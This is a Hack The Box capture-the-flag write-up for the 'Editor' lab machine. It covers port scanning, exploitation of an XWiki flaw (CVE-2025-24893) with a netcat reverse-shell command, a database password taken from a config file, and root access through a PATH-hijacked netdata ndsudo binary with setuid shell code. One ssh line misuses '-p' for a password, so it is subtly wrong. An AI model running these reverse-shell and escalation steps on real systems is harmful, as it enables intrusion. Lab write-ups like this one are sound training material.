### Hack The Box Writeup: Editor

## Overview

- **Machine Name**: Editor
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: August 2025

## Tools Used

- **Enumeration**: 
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
ping -c 1 10.10.11.80

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn -oG allPorts 10.10.11.80
nmap -sCV -p22,80,8080 -oN targeted 10.10.11.80

# /etc/hosts
10.10.11.80 editor.htb

whatweb http://10.10.11.80:80

```

### Exploitation
```bash
# CVE-2025-24893
git clone https://github.com/gunzf0x/CVE-2025-24893

# usage
$ python3 CVE-2025-24893.py -t 'http://example.com:8080' -c 'busybox nc 10.10.10.10 9001 -e /bin/bash'

nc -nlvp 443

python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.16.31 443 -e /bin/bash'

find /usr/lib/xwiki -name "*.xml"
# ans
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

ssh oliver@10.10.11.80 -p theEd1t0rTeam99

cat user.txt


```

### Privilege Escalation

```bash
uname -r
# ans
5.15.0-151-generic

find / -type f -perm /4000
# ans
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

https://github.com/AzureADTrent/CVE-2024-32019-POC

# Creating file

```
```c
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
```bash
# compiling
gcc poc.c -o nvme

# Sending file
<>
nc -nlvp 3636 > nvme-list # victims machine
nc 10.10.11.80 3636 < nvme # attacker machine

chmod +x nvme-list # in /tmp dir
export PATH=/tmp:$PATH

./ndsudo nvme-list

```
## Challenges Faced


## Lessons Learned

- CVE-2024-32019

## References


---

*Written by YourName, 08.2025. Feedback welcome at github.com/edibauer.*